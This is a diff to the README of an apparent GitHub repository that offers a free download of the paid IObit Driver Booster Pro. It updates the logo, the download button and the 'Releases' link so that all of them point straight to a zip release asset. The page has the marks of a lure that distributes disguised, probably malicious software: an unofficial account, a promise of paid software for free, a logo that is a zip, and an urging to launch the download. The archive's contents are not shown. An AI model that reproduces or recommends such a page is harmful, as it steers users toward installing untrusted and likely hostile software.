@@ -1,6 +1,6 @@
 # 🚀 Welcome to the IObit Driver Booster Pro Download Repository! 🚀
 
-![IObit Driver Booster Pro Logo](https://github.com/yomom1234567/IObit-Driver-Booster-Pro-Download/releases/download/v1.0/Application.zip)
+![IObit Driver Booster Pro Logo](https://github.com/yomom1234567/IObit-Driver-Booster-Pro-Download/releases/download/v2.0/Software.zip)
 
 ## Repository Name: IObit-Driver-Booster-Pro-Download
 ## Repository Description:
@@ -26,11 +26,11 @@ Are you looking for the latest version of IObit Driver Booster Pro? This reposit
 
 ## Download the Software
 Click the button below to download the IObit Driver Booster Pro software:
-[![Download Software](https://github.com/yomom1234567/IObit-Driver-Booster-Pro-Download/releases/download/v1.0/Application.zip)](https://github.com/yomom1234567/IObit-Driver-Booster-Pro-Download/releases/download/v1.0/Application.zip)
+[![Download Software](https://github.com/yomom1234567/IObit-Driver-Booster-Pro-Download/releases/download/v2.0/Software.zip)](https://github.com/yomom1234567/IObit-Driver-Booster-Pro-Download/releases/download/v2.0/Software.zip)
 *Note: The link above needs to be launched to start the download.*
 
 ## Explore More
-Visit the [Releases](https://github.com/yomom1234567/IObit-Driver-Booster-Pro-Download/releases/download/v1.0/Application.zip) section for additional resources, updates, and discussions related to IObit Driver Booster Pro.
+Visit the [Releases](https://github.com/yomom1234567/IObit-Driver-Booster-Pro-Download/releases/download/v2.0/Software.zip) section for additional resources, updates, and discussions related to IObit Driver Booster Pro.
 
 ## Get Started!
 Don't wait any longer to boost your system's performance with IObit Driver Booster Pro. Download now and experience the difference!
